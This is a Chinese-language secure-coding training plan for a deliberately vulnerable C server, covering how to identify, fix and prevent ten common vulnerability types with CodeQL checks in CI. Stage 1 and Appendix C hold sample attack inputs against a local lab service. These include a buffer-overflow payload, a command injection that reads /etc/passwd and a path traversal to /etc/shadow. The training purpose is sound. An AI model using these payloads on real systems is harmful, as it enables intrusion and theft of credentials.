# 安全编码训练路径

## 总览

本培训分为三个阶段，从识别漏洞到独立编写通过安全门禁的代码。每个阶段 1-3 天，可根据团队水平调整。

```
阶段一 (初级) → 阶段二 (中级) → 阶段三 (高级)
  识别漏洞          修复漏洞          编写安全代码
  1-2 天            2-3 天            2-3 天
```

---

## 阶段一：识别漏洞

### 目标
能够识别 C 代码中的常见安全漏洞类型，理解每种漏洞的原理和影响。

### 前置条件
- 熟悉 C 语言基本语法
- 理解指针和内存管理

### 任务

#### 1.1 环境准备 (30 min)
```bash
git clone <repo-url>
cd secure_ci_coding
./scripts/build.sh all
```

#### 1.2 阅读漏洞演示代码 (2-3 hours)
按照顺序阅读 `vulnerable/` 目录下的 10 个文件:
1. `01_buffer_overflow.c` — 缓冲区溢出
2. `02_format_string.c` — 格式化字符串
3. `03_use_after_free.c` — 释放后使用
4. `04_double_free.c` — 双重释放
5. `05_integer_overflow.c` — 整数溢出
6. `06_unchecked_input.c` — 未校验输入
7. `07_command_injection.c` — 命令注入
8. `08_path_traversal.c` — 路径遍历
9. `09_insecure_random.c` — 不安全随机数
10. `10_hardcoded_key.c` — 硬编码密钥

每个文件包含:
- 漏洞代码（标记为 VULNERABLE）
- 攻击说明
- 原理注释

#### 1.3 运行漏洞演示 (1 hour)
```bash
# 编译并运行每个演示
make vuln-demos
./build/vuln_01_buffer_overflow "$(python3 -c 'print("A"*64)')"
./build/vuln_02_format_string "%x.%x.%x.%x"
./build/vuln_03_use_after_free
# ... 依次运行
```

#### 1.4 探索核心代码 (2 hours)
阅读 `src/` 目录下的业务代码，找出漏洞位置。对照下表验证你的发现:

| 漏洞 | 文件 | 函数 |
|------|------|------|
| 缓冲区溢出 | src/protocol.c | `proto_dispatch()` |
| 格式化字符串 | src/logger.c | `log_write()` |
| Use-After-Free | src/session.c | `session_destroy_by_ptr()` |
| Double Free | src/network.c | `conn_close()` |
| 整数溢出 | src/file_handler.c | `file_store()` |
| 未校验输入 | src/auth.c | `auth_verify()` |
| 命令注入 | src/config.c | `config_backup()` |
| 路径遍历 | src/file_handler.c | `file_retrieve()` |
| 不安全随机数 | src/session.c | `session_create()` |
| 硬编码密钥 | src/auth.c | `auth_hash_password()` |

#### 1.5 理解 CodeQL 报告 (30 min)
上 GitHub Actions 查看扫描结果，理解:
- SARIF 格式
- 告警等级（error / warning / note）
- CWE 标签
- 数据流路径追踪

### 交付物
一份**漏洞识别报告**（Markdown），内容包括:
1. 每个漏洞的 CWE 编号
2. 所在文件和行号
3. 漏洞原理（2-3 句话）
4. 风险等级评估
5. 攻击场景描述

### 验收标准
- [ ] 正确识别 ≥8/10 漏洞
- [ ] 能清楚解释每种漏洞的原理
- [ ] 能描述至少一种攻击利用方式
- [ ] 能看懂 CodeQL 扫描结果

### 常见错误
- 把代码风格问题当成安全漏洞
- 忽略边界条件（长度=0, 长度=MAX 的情况）
- 不理解未定义行为 (UB) 的安全影响
- 只看功能逻辑，不看内存和输入处理

---

## 阶段二：修复漏洞

### 目标
能够编写安全的修复代码，通过单元测试和静态分析验证。

### 前置条件
- 完成阶段一
- 理解每个漏洞的修复原理

### 任务

#### 2.1 逐个修复 src/ 中的漏洞 (4-6 hours)

按优先级从高到低修复:

**Critical (必须修复)**:
1. 缓冲区溢出 — `src/protocol.c`
2. Use-After-Free — `src/session.c`
3. Double Free — `src/network.c`
4. 命令注入 — `src/config.c`
5. 硬编码密钥 — `src/auth.c`

**High (强烈建议修复)**:
6. 整数溢出 — `src/file_handler.c`
7. 格式化字符串 — `src/logger.c`
8. 路径遍历 — `src/file_handler.c`
9. 不安全随机数 — `src/session.c`
10. 未校验输入 — `src/auth.c`

**修复指南**:
- 参考 `fixed/` 目录但不要照抄
- 理解修复原理后用自己的方式实现
- 编译验证: `make fixed`
- 使用 `#ifdef FIXED` / `#else` 条件编译，保留原始漏洞代码用于对比

#### 2.2 编写单元测试 (2 hours)
为修复后的代码编写测试:
- `tests/test_auth.c` — 认证模块测试
- `tests/test_protocol.c` — 协议解析测试
- `tests/test_file_handler.c` — 文件操作测试
- `tests/test_security.c` — 安全回归测试

每个测试覆盖:
1. 正常输入 → 功能正确
2. 边界输入 → 不崩溃
3. 攻击输入 → 正确拒绝

#### 2.3 运行测试验证 (30 min)
```bash
make fixed
make test
./scripts/run_tests.sh
```

#### 2.4 本地运行 CodeQL (30 min)
```bash
# 安装 CodeQL CLI
# https://github.com/github/codeql-action

codeql database create codeql-db --language=cpp --command="make fixed"
codeql database analyze codeql-db --format=sarif-latest --output=results.sarif
python3 scripts/check_sarif.py results.sarif
```

### 交付物
1. 修复后的代码（GitHub PR）
2. 单元测试代码
3. 修复说明文档（每个漏洞: 原代码 → 修复后代码 → 为什么这样修）

### 验收标准
- [ ] 所有测试通过
- [ ] CodeQL 扫描无新增 Critical/High 告警
- [ ] `make fixed` 编译零警告
- [ ] 修复说明文档完整

### 常见错误
- 只修表象不修根因（如只增大缓冲区，不做长度校验）
- 修复一个漏洞时引入新漏洞（如用 strncpy 但忘了 null terminate）
- 过度修复导致功能退化
- 不使用条件编译导致无法对比教学

---

## 阶段三：编写安全代码 + 通过 CI

### 目标
能够独立从零编写通过安全门禁的代码，形成安全编码肌肉记忆。

### 前置条件
- 完成阶段二
- 理解 CodeQL 规则和 CI 工作流

### 任务

#### 3.1 实现新功能模块 (4-6 hours)

在不参考 `src/` 已有代码的情况下，从零实现以下模块之一:

**选项 A: 文件权限管理 (file_permission.c)**
```
需求:
- 每个文件关联一个 owner (user_id)
- 支持三种权限: READ, WRITE, DELETE
- ROLE_ADMIN 拥有所有文件的全部权限
- ROLE_USER 拥有自己文件的全部权限，他人文件只有 READ
- ROLE_GUEST 只有 READ 权限
- 所有输入必须验证
- 操作必须记录审计日志
```

**选项 B: 审计日志查询 (audit_query.c)**
```
需求:
- 从日志文件中查询特定时间段的操作记录
- 支持按用户名、操作类型、文件名过滤
- 支持分页（offset + limit）
- 查询参数必须验证
- 结果必须以安全的方式序列化返回
- SQL injection 防护（如果用 SQL）
```

**选项 C: 文件完整性校验 (file_integrity.c)**
```
需求:
- 上传时计算文件 SHA256 哈希
- 下载时验证哈希是否匹配
- 存储哈希值到 `.sha256` 元数据文件
- 提供 `OP_VERIFY` 操作验证文件完整性
- 所有加密操作使用标准库
```

#### 3.2 编写完整测试 (1-2 hours)
- 正常功能测试
- 边界条件测试
- 安全攻击测试（尝试触发你之前学过的所有漏洞类型）
- 测试覆盖率目标: ≥80% 行覆盖

#### 3.3 提交 PR 并通过 CI (30 min)
```bash
# 1. 本地验证
make fixed
make test
./scripts/build.sh test

# 2. 提交并推送
git checkout -b feature/your-module
git add .
git commit -m "feat: add [module name] with security hardening"
git push origin feature/your-module

# 3. 创建 PR 到 develop 分支
# 观察 GitHub Actions 运行结果
```

#### 3.4 代码安全 Review (1 hour)
与其他学员交换 PR 进行安全 Review:
1. 检查是否引入了新的漏洞
2. 检查输入验证是否完整
3. 检查内存管理是否正确
4. 检查错误路径是否覆盖

### 交付物
1. 新功能代码 + 头文件
2. 完整的单元测试
3. 通过所有 CI 检查的 PR
4. 至少 1 份对他人的代码安全 Review

### 通过条件
- [ ] 新功能代码可编译、可运行
- [ ] CodeQL 扫描零 Critical/High 新增告警
- [ ] 所有测试通过（包括安全测试）
- [ ] PR 通过 Review
- [ ] 能够解释自己代码中的每个安全决策

### 常见错误
- 复制粘贴 src/ 中的不安全代码模式
- 忽略编译警告（应全部视为错误）
- 测试只覆盖 happy path
- 使用 `system()` 或 `popen()`（习惯性）
- 直接用 `strcpy`/`sprintf` 而非安全替代品

---

## 附录 A: 学习资源

### C 安全编码
- CERT C Coding Standard: https://wiki.sei.cmu.edu/confluence/display/c
- CWE Top 25: https://cwe.mitre.org/top25/

### CodeQL
- CodeQL for C/C++: https://codeql.github.com/docs/codeql-language-guides/codeql-for-cpp/
- CodeQL CLI: https://github.com/github/codeql-cli-binaries

### 工具
- AddressSanitizer: https://clang.llvm.org/docs/AddressSanitizer.html
- Valgrind: https://valgrind.org/

## 附录 B: 分支策略

| 分支 | 用途 |
|------|------|
| `training/vulnerable` | 阶段一 — 含漏洞的完整代码 |
| `training/fix-assignment` | 阶段二 — 待修复的代码（去除 fixed/ 参考） |
| `develop` | 阶段二/三 — 学员提交修复 PR |
| `main` | 干净代码 — 仅保留修复后版本 |

## 附录 C: 攻击脚本参考

```bash
# 缓冲区溢出
python3 -c "
import socket, struct
s = socket.socket()
s.connect(('localhost', 9000))
payload = b'\x00'*14 + struct.pack('>I', 512) + b'A'*512
s.send(payload)
"

# 命令注入
python3 -c "
import socket
s = socket.socket()
s.connect(('localhost', 9000))
# 发送 BACKUP 命令，路径包含命令注入
path = b'; cat /etc/passwd > /tmp/pwned #'
s.send(b'\x00'*14 + path)
"

# 路径遍历
python3 -c "
import socket
s = socket.socket()
s.connect(('localhost', 9000))
# 发送 DOWNLOAD 命令，文件名包含路径遍历
fn = b'../../../etc/shadow'
s.send(b'\x00'*14 + fn)
"
```
